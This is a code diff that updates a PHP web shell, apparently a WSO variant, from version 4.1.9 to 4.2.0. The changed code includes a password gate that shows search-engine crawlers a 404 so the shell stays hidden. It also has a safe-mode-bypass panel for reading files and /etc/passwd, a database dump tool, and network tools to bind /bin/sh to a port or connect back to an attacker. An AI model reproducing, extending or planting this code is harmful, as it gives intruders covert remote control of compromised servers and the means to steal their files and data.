@@ -23,7 +23,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.1.9');
+@define('VERSION', '4.2.0');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -37,6 +37,19 @@ if(!empty($▛)) {
         prototype(md5($_SERVER['HTTP_HOST']), $▛);
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
         hardLogin();
+}
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
+    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
+
+function hardLogin() {
+		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		  header('HTTP/1.0 404 Not Found');
+		  exit;
+		  }
+		}
+	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='go' value='>>' style='border:none;background-color:#FFDB5F;color:#fff;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
@@ -74,7 +87,7 @@ function hardHeader() {
 	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
 	.tooltip:hover::after {opacity:1;visibility:visible;}
 	.ml1		{border:1px solid #1e252e;padding:5px;margin:0;overflow:auto;}
-	.bigarea	{min-width:100%;max-width:100%;height:250px;}
+	.bigarea	{min-width:100%;max-width:100%;height:400px;}
 	input, textarea, select	{margin:0;color:#fff;background-color:#1e252e;border:1px solid #060a10; font:9pt Courier New;outline:none;}
 	form		{margin:0px;}
 	#toolsTbl	{text-align:center;}
@@ -86,6 +99,7 @@ function hardHeader() {
 	.main tr:hover{background-color:#354252;}
 	.main td, th{vertical-align:middle;}
 	input[type='submit']:hover{background-color:#0663D5;}
+	input[type='button']:hover{background-color:#0663D5;}
 	.l1			{background-color:#1e252e;}
 	pre			{font:9pt Courier New;}
 </style>
@@ -205,8 +219,8 @@ function hardHeader() {
 			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
 	}
 	/* (С) 08.2015 dmkcv */
-	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'.
-		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
+	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
+		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
@@ -256,19 +270,6 @@ function ex($in) {
 		pclose($f);
 	}else return "↳ Unable to execute command\n";
 	return ($▖==''?"↳ Query did not return anything\n":$▖);
-}
-if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
-    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
-
-function hardLogin() {
-		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
-		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		  header('HTTP/1.0 404 Not Found');
-		  exit;
-		  }
-		}
-	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='go' value='>>' style='border:none;background-color:#FFDB5F;color:#fff;'></form></pre>");
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -907,7 +908,7 @@ echo "<script>
 			$files[] = array_merge($tmp, array('type' => 'file'));
 		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
 			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
-		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i]))
+		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
 			$dirs[] = array_merge($tmp, array('type' => 'dir'));
 	}
 	$GLOBALS['sort'] = $sort;
@@ -1026,6 +1027,7 @@ function actionStringTools() {
             <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
 			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
 			<input type='submit' value='tools4noobs.com' onclick=\"document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()\"><br>
+			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
 			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
 			<input type='submit' value='artlebedev.ru' onclick=\"document.hf.action='https://www.artlebedev.ru/tools/decoder/';document.hf.submit()\"><br>
 		</form></div>";
@@ -1077,7 +1079,7 @@ function actionSafeMode() {
 	$temp = ob_get_clean();
 	hardHeader();
 	echo '<h1>Safe mode bypass</h1><div class=content>';
-	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
+	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
 	if($temp)
 		echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>';
 	echo '</div>';
@@ -1429,7 +1431,7 @@ echo ">PostgreSql</option></select></td>
 <td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
 <td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
 <td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
-	$tmp = "<input type=text name=sql_base value=''>";
+	$tmp = "<input type=text name=sql_base value='' required>";
 	if(isset($_POST['sql_host'])){
 		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
 			switch($_POST['charset']) {
@@ -1488,7 +1490,7 @@ echo ">PostgreSql</option></select></td>
 					$value = htmlspecialchars($value);
 					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
 				}
-				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
+				echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
 				if(@$_POST['p1'] == 'select') {
 					$_POST['p1'] = 'query';
                     $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
@@ -1570,7 +1572,7 @@ function actionNetwork() {
 	echo "<h1>Network tools</h1><div class=content>
 	<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
 	<span>Bind port to /bin/sh</span><br/>
-	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit value='>>'>
+	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit value='>>'>
 	</form>
 	<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
 	<span>Back-connect to</span><br/>
